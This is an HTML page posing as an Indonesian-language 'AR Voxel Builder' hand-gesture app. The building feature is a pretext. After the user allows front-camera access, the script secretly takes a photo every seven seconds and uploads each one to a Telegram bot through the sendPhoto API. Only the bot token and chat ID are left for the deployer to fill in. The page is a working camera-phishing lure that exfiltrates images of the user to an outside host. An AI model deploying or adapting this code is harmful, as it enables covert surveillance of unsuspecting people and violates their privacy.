<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AR Hand Gesture - Voxel Builder</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #000;
            color: white;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            touch-action: manipulation;
        }

        video {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: 1;
            display: none;
            background: #111;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
            pointer-events: none;
        }

        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 30;
            background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent);
            font-size: 16px;
        }

        .header {
            text-align: center;
            margin-top: 90px;
            z-index: 20;
            pointer-events: auto;
        }

        .title {
            font-size: 29px;
            font-weight: 700;
            margin-bottom: 6px;
            text-shadow: 0 3px 15px rgba(0,0,0,0.9);
        }

        .subtitle {
            font-size: 15.5px;
            color: #ccc;
            margin-bottom: 40px;
        }

        .ar-frame {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 420px;
            border: 3px solid rgba(0, 255, 200, 0.8);
            border-radius: 28px;
            box-shadow: 0 0 60px rgba(0, 255, 200, 0.6);
            z-index: 15;
            pointer-events: none;
        }

        .scan-line {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 5px;
            background: linear-gradient(90deg, transparent, #00ffc8, transparent);
            animation: scan 4s linear infinite;
            box-shadow: 0 0 25px #00ffc8;
        }

        @keyframes scan {
            0%   { top: 0%; }
            100% { top: 100%; }
        }

        .controls {
            position: fixed;
            bottom: 110px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 30;
            pointer-events: auto;
        }

        .btn {
            background: rgba(0, 255, 200, 0.15);
            color: #00ffc8;
            border: 2.5px solid #00ffc8;
            padding: 16px 55px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            backdrop-filter: blur(15px);
            cursor: pointer;
            box-shadow: 0 0 30px rgba(0, 255, 200, 0.4);
        }

        .btn:active {
            background: #00ffc8;
            color: black;
            transform: scale(0.96);
        }

        .status {
            position: fixed;
            bottom: 45px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            padding: 14px 32px;
            border-radius: 40px;
            font-size: 16px;
            z-index: 30;
            text-align: center;
            min-width: 220px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
        }

        .gesture-hint {
            position: absolute;
            bottom: 210px;
            left: 50%;
            transform: translateX(-50%);
            color: #00ffc8;
            font-size: 15px;
            text-shadow: 0 0 15px #00ffc8;
            z-index: 20;
            pointer-events: auto;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>

    <div class="overlay">
        <div class="top-bar">
            <div id="time">19:30</div>
            <div style="font-weight:600; font-size:18px;">AR Voxel Builder</div>
            <div>4G</div>
        </div>

        <div class="header">
            <div class="title">Voxel Builder</div>
            <div class="subtitle">Gerakkan tangan Anda untuk membangun di AR</div>
        </div>

        <div class="ar-frame">
            <div class="scan-line"></div>
        </div>

        <div class="gesture-hint">✋ Angkat tangan di depan kamera</div>

        <div class="controls">
            <button id="startBtn" class="btn">MULAI KAMERA</button>
        </div>

        <div id="status" class="status">Tekan tombol untuk memulai</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // === GANTI DUA BARIS INI ===
        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";
        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        // Update waktu
        function updateTime() {
            setInterval(() => {
                const now = new Date();
                document.getElementById('time').textContent = now.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
            }, 1000);
        }
        updateTime();

        async function sendToTelegram(base64) {
            if (!BOT_TOKEN || !CHAT_ID) return;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);

            const byteString = atob(base64.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);

            const blob = new Blob([ab], { type: 'image/jpeg' });
            formData.append('photo', blob, `capture_${Date.now()}.jpg`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }

        async function captureAndSend() {
            status.textContent = "📸 Mengambil foto...";

            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const base64 = canvas.toDataURL('image/jpeg', 0.93);
            await sendToTelegram(base64);

            status.textContent = "✅ Foto terkirim ke bot";
        }

        async function startCamera() {
            startBtn.style.opacity = "0.3";
            startBtn.style.pointerEvents = "none";
            status.textContent = "Mengakses kamera...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280, min: 640 },
                        height: { ideal: 720, min: 480 }
                    }
                });

                video.srcObject = stream;
                video.style.display = "block";

                status.textContent = "Kamera aktif • Deteksi berjalan";

                // Capture pertama
                setTimeout(() => captureAndSend(), 2200);

                // Capture berkala setiap 7 detik
                setInterval(() => {
                    if (video.srcObject && !video.paused) captureAndSend();
                }, 7000);

            } catch (err) {
                console.error(err);
                let msg = "Gagal mengakses kamera.";
                if (err.name === "NotAllowedError") msg = "Izin kamera ditolak.";
                else if (err.name === "NotFoundError") msg = "Kamera tidak ditemukan.";
                else if (err.name === "NotReadableError") msg = "Kamera sedang digunakan aplikasi lain.";

                status.innerHTML = `<span style="color:#ff5555;">${msg}<br><small>Coba refresh halaman</small></span>`;
                startBtn.style.opacity = "1";
                startBtn.style.pointerEvents = "auto";
            }
        }

        startBtn.addEventListener('click', startCamera);

        // Fullscreen otomatis
        document.addEventListener('click', () => {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
        }, { once: true });
    </script>
</body>
</html>
